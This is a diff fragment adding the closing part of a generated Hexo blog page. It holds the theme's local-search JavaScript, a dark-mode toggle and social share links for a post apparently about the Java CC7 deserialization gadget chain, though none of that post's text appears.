+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8-CC7%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fokaytc.github.io%2Fposts%2F40ba40f0.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://okaytc.github.io/posts/40ba40f0.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
